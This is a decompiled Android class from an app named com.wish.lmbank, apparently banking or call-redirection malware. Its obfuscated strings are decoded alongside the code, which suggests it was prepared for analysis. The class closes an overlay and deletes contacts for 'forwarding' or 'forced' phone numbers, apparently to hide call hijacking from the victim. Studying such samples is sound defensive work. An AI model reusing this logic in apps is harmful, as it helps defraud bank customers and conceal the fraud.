//
// Decompiled by Jadx - 726ms
//
package com.wish.lmbank.overlay;

import android.content.Context;
import android.text.TextUtils;
import com.wish.lmbank.utils.ContentUtils;
import com.wish.lmbank.utils.LogUtils;
import gv00l3ah.mvdt7w.bb7d7pu7;
import wei.mark.standout.StandOutWindow;

class OverlayService2 implements Runnable {
    final Context val$context;
    final String val$finalForcedPhone;
    final String val$finalForwardingPhone;

    OverlayService2(String str, Context context, String str2) {
        this.val$finalForwardingPhone = str;
        this.val$context = context;
        this.val$finalForcedPhone = str2;
    }

    @Override
    public void run() {
        if (OverlayService.isShow) {
            StringBuilder sb = new StringBuilder();
//-^-             sb.append(OverlayService.access$100() + bb7d7pu7.m5998("RUkICh0ABgc6HQYZRUkKBQYaDCgFBUVJDwYbHggbDQAHDjkBBgcMU0k") + this.val$finalForwardingPhone + bb7d7pu7.m5998("RUkZAQYHDCccBAsMGzZTSQ") + OverlayService.access$200());
            sb.append(OverlayService.access$100() + ", actionStop, closeAll, forwardingPhone: " + this.val$finalForwardingPhone + ", phoneNumber_: " + OverlayService.access$200());
            int access$300 = OverlayService.access$300();
//-^-             String str = bb7d7pu7.m5998("RUkNDAUMHQwqBgcdCAodU0k");
            String str = ", deleteContact: ";
            if (access$300 == 2 && !TextUtils.isEmpty(this.val$finalForwardingPhone)) {
                boolean deleteContact = ContentUtils.deleteContact(this.val$context, OverlayService.access$200(), this.val$finalForwardingPhone);
//-^-                 sb.append(str + deleteContact + bb7d7pu7.m5998("RUkPBhseCBsNAAcOOQEGBwxTSQ") + this.val$finalForwardingPhone);
                sb.append(str + deleteContact + ", forwardingPhone: " + this.val$finalForwardingPhone);
            } else if (OverlayService.access$300() == 1 && !TextUtils.isEmpty(this.val$finalForcedPhone)) {
                boolean deleteContact2 = ContentUtils.deleteContact(this.val$context, OverlayService.access$200(), this.val$finalForcedPhone);
//-^-                 sb.append(str + deleteContact2 + bb7d7pu7.m5998("RUkPBhsKDA05AQYHDDZTSQ") + this.val$finalForcedPhone);
                sb.append(str + deleteContact2 + ", forcedPhone_: " + this.val$finalForcedPhone);
            }
            LogUtils.callLog(sb.toString());
            StandOutWindow.closeAll(this.val$context, OverlayService.class);
            OverlayService.isShow = false;
        }
    }
}
